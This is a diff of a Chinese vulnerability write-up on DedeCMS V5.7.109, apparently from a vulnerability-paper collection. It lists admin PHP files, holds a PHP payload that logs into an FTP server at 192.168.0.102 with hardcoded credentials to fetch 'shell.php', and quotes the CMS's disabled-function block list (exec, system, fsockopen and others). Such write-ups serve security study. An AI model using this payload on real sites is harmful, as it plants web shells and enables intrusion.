@@ -29,7 +29,7 @@ source: "MrWQ/vulnerability-paper"
 /uploads/dede/article_string_mix.php
 /uploads/dede/sys_data.php
 /uploads/dede/sys_task.php
-/uploads/dede/media_add.php 
+/uploads/dede/media_add.php 
 /uploads/dede/article_template_rand.php
 
 ```
@@ -71,26 +71,26 @@ payload 如下：
 ```
 <?
 
-$ftp_server = "192.168.0.102";
-$ftp_username = "administrator";
-$ftp_password = "147258369";
+$ftp_server = "192.168.0.102";
+$ftp_username = "administrator";
+$ftp_password = "147258369";
 
-$file = "shell.php";
-$local_file = "shell2.php";
+$file = "shell.php";
+$local_file = "shell2.php";
 
-// set up basic connection
-$conn_id = ftp_connect($ftp_server);
+// set up basic connection
+$conn_id = ftp_connect($ftp_server);
 
-// login with username and password
-$login_result = ftp_login($conn_id, $ftp_username, $ftp_password);
-// try to download $file and save to $local_file
-if (ftp_get($conn_id, $local_file, $file, FTP_BINARY)) {
-  echo "Successfully downloaded $file\n";
-} else {
-  echo "There was a problem while downloading $file\n";
+// login with username and password
+$login_result = ftp_login($conn_id, $ftp_username, $ftp_password);
+// try to download $file and save to $local_file
+if (ftp_get($conn_id, $local_file, $file, FTP_BINARY)) {
+  echo "Successfully downloaded $file\n";
+} else {
+  echo "There was a problem while downloading $file\n";
 }
 
-// close the connection
+// close the connection
 ftp_close($conn_id);
 ?>
 
@@ -131,7 +131,7 @@ DedeCMS-V5.7.109-UTF8\uploads\dede\media_add.php
 
 ```
 phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
-$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders
+$cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert,getallheaders
 
 ```
 
